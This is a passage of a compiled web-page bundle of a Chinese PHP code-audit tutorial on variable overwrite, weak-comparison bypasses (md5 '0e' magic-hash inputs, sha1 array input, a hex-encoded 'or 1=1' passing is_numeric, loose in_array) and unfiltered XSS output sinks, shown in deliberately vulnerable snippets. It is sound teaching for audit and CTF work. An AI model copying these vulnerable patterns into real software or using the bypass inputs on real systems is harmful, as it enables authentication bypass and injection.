important"}),"?>"))))),Object(p.b)("p",null,"那么执行结果是怎样的呢？当我们直接打开页面的时候它会输出",Object(p.b)("inlineCode",{parentName:"p"},"You are false!"),",而当我们通过GET传参",Object(p.b)("inlineCode",{parentName:"p"},"name=Ameng"),"的时候，它会回显",Object(p.b)("inlineCode",{parentName:"p"},"You are right!"),"。那么这是为什么呢？我们来分析一下"),Object(p.b)("p",null,"关键点就在于",Object(p.b)("inlineCode",{parentName:"p"},"$$"),"这种写法。这种写法称为可变变量。一个变量能够获取一个普通变量的值作为这个可变变量的变量名。当使用",Object(p.b)("inlineCode",{parentName:"p"},"foreach"),"来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。这样就产生了变量覆盖漏洞，如上代码示例。其执行过程为",Object(p.b)("inlineCode",{parentName:"p"},"$$key"),"=",Object(p.b)("inlineCode",{parentName:"p"},"$name"),"，最后赋值为",Object(p.b)("inlineCode",{parentName:"p"},"$value"),"，从而实现了变量覆盖。"),Object(p.b)("h2",{className:"__internal",id:"弱类型比较"},"弱类型比较",Object(p.b)("a",c({parentName:"h2"},{href:"#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"md5函数和sha1绕过"},"md5()函数和sha1()绕过",Object(p.b)("a",c({parentName:"h3"},{href:"#md5%E5%87%BD%E6%95%B0%E5%92%8Csha1%E7%BB%95%E8%BF%87","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"关于这两个函数想必我们不陌生，无论是在实际代码审计中，还是在CTF比赛中，这些我们都是碰到过的函数。那么当我们遇到用这两个函数来判断的时候，如果绕过呢？"),Object(p.b)("p",null,"PHP 在处理哈希字符串的时候，会使用",Object(p.b)("inlineCode",{parentName:"p"},"!="),"或者",Object(p.b)("inlineCode",{parentName:"p"},"=="),"来对哈希值进行比较，它会把每一个",Object(p.b)("inlineCode",{parentName:"p"},"0E"),"开头的哈希值都解释为0，那么这个时候问题就来了，如果两个不同的值，经过哈希以后它们都变成了",Object(p.b)("inlineCode",{parentName:"p"},"0E"),"开头的哈希值，那么 PHP 就会将它们视作相等处理。那么",Object(p.b)("inlineCode",{parentName:"p"},"0E"),"开头的哈希值有哪些呢？"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(p.b)("pre",c({parentName:"div"},{className:"language-text"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-text"}),"s878926199a\n0e545993274517709034328855841020\ns155964671a\n0e342768416822451524974117254469\ns214587387a\n0e848240448830537924465865611904\ns214587387a\n0e848240448830537924465865611904\ns878926199a\n0e545993274517709034328855841020\ns1091221200a\n0e940624217856561557816327384675\ns1885207154a\n0e509367213418206700842008763514\ns1502113478a\n0e861580163291561247404381396064\ns1885207154a\n0e509367213418206700842008763514\ns1836677006a\n0e481036490867661113260034900752\ns155964671a\n0e342768416822451524974117254469\ns1184209335a\n0e072485820392773389523109082030\ns1665632922a\n0e731198061491163073197128363787\ns1502113478a\n0e861580163291561247404381396064\ns1836677006a\n0e481036490867661113260034900752\ns1091221200a\n0e940624217856561557816327384675\ns155964671a\n0e342768416822451524974117254469\ns1502113478a\n0e861580163291561247404381396064\ns155964671a\n0e342768416822451524974117254469\ns1665632922a\n0e731198061491163073197128363787\ns155964671a\n0e342768416822451524974117254469\ns1091221200a\n0e940624217856561557816327384675\ns1836677006a\n0e481036490867661113260034900752\ns1885207154a\n0e509367213418206700842008763514\ns532378020a\n0e220463095855511507588041205815\ns878926199a\n0e545993274517709034328855841020\ns1091221200a\n0e940624217856561557816327384675\ns214587387a\n0e848240448830537924465865611904\ns1502113478a\n0e861580163291561247404381396064\ns1091221200a\n0e940624217856561557816327384675\ns1665632922a\n0e731198061491163073197128363787\ns1885207154a\n0e509367213418206700842008763514\ns1836677006a\n0e481036490867661113260034900752\ns1665632922a\n0e731198061491163073197128363787\ns878926199a\n0e545993274517709034328855841020"))),Object(p.b)("p",null,"来个简单的例子吧"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'a'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'b'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"!=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"&&")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"md5"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"==")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"md5"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'这就是弱类型绕过'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"else"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'再思考一下'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"从上面我给出的哪些值中，挑两个不同的值传入参数，就能看到相应的结果"),Object(p.b)("p",null,"上面是",Object(p.b)("inlineCode",{parentName:"p"},"md5()"),"函数的绕过姿势，那么",Object(p.b)("inlineCode",{parentName:"p"},"sha1()"),"如何绕过呢？再来看一个简单的例子"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'a'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'b'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"isset"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"sha1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"===")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"sha1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'nice!!!'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"else"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'Try again!'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"当我们传入",Object(p.b)("inlineCode",{parentName:"p"},"a[]=1&b[]=2"),"的时候，虽然它会给出警告，说我们应该传入字符串而不应该是数组，但是它还是输出了",Object(p.b)("inlineCode",{parentName:"p"},"nice!!!"),"，所以我们完全可以用数字来绕过",Object(p.b)("inlineCode",{parentName:"p"},"sha1()"),"函数的比较。"),Object(p.b)("h3",{className:"__internal",id:"is_numeric绕过"},"is_numeric()绕过",Object(p.b)("a",c({parentName:"h3"},{href:"#is_numeric%E7%BB%95%E8%BF%87","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"我们先来了解一下这个函数。此函数是检测变量是否为数字或者数字字符串"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"is_numeric"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," mixed ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$var"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," bool"))),Object(p.b)("p",null,"如果",Object(p.b)("inlineCode",{parentName:"p"},"var"),"是数字或者数字字符串那么就返回TRUE，否则就返回FALSE。那么这里说的绕过是什么姿势呢？是十六进制。我们先来看一个简单的例子。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"is_numeric"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'0x31206f722031'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'It meets my requirement'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"else"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'Try again'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n执行结果——>\nIt meets my requirement"))),Object(p.b)("p",null,"这里说一下",Object(p.b)("inlineCode",{parentName:"p"},"0x31206f722031"),"这个是什么？这个是",Object(p.b)("inlineCode",{parentName:"p"},"or 1=1"),"的十六进制，从这里可以看出，如果某处使用了此函数，并将修饰后的变量带入数据库查询语句中，那么我们就能利用此漏洞实现sql注入。同样的，这个漏洞再CTF比赛中也是很常见的。"),Object(p.b)("h3",{className:"__internal",id:"in_array绕过"},"in_array()绕过",Object(p.b)("a",c({parentName:"h3"},{href:"#in_array%E7%BB%95%E8%BF%87","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数用来检测数组中是否存在某个值。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"in_array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," mixed ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$needle"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$haystack"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," bool ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$strict")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token boolean constant"}),"FALSE"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," bool"))),Object(p.b)("h4",{className:"__internal",id:"参数-28"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-28","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"needle：带搜索的值(区分大小写)。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"haystack：带搜索的数组。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"strict：若此参数的值为TRUE，那么",Object(p.b)("inlineCode",{parentName:"li"},"in_array()"),"函数将会检查needle的类型是否和haystack中的类型相同。")),Object(p.b)("p",null,"有时候我们再传入一个数组的时候，代码可能会过滤某些敏感字符串，但是我们又需要传入这样的字符串，那么我们应该如何绕过它的检测呢？"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$myarr")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'Ameng'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$needle")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"0"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"in_array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$needle"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$myarr"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"It\'s in array"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"else"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"not in array"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"上面代码示例执行的结果会是什么呢？从简单的逻辑上分析。0是不存在要搜索的数组中的，所以理论上，应该是输出",Object(p.b)("inlineCode",{parentName:"p"},"not in array"),"，但是实际却输出了",Object(p.b)("inlineCode",{parentName:"p"},"It's in array"),"。这是为什么呢？原因就在于PHP的默认类型转换。这里我们第三个参数并没有设置为",Object(p.b)("inlineCode",{parentName:"p"},"true"),"那么默认就是非严格比较，所以在数字与字符串进行比较时，字符串先被强制转换成数字，然后再进行比较。并且因为某些类型转换正在发生，就会导致发生数据丢失，并且都被视为相同。所以归根到底还是非严格比较导致的问题。所以再遇到这个函数用来变量检测的时候，我们可以看看第三个参数是否开启，若未开启，则存在数组绕过。"),Object(p.b)("h2",{className:"__internal",id:"xss"},"XSS",Object(p.b)("a",c({parentName:"h2"},{href:"#xss","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"在这里首先你要对XSS的基本原理要知道。PHP中一下这些函数之所以会出现XSS的漏洞情况，主要还是没有对输出的变量进行过滤。"),Object(p.b)("h3",{className:"__internal",id:"print"},"print()",Object(p.b)("a",c({parentName:"h3"},{href:"#print","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'x'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"print"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200828220802.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"print_r"},"print_r()",Object(p.b)("a",c({parentName:"h3"},{href:"#print_r","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'x'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"print_r"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200828220802.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"echo"},"echo()",Object(p.b)("a",c({parentName:"h3"},{href:"#echo","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'x'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"',Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str")),'"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"我们传入相应参数，执行结果如下："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200828220802.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"printf"},"printf()",Object(p.b)("a",c({parentName:"h3"},{href:"#printf","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'x'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"printf"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"执行结果和上面相同，我就不再贴图片了。"),Object(p.b)("h3",{className:"__internal",id:"sprintf"},"sprintf()",Object(p.b)("a",c({parentName:"h3"},{href:"#sprintf","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'x'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," 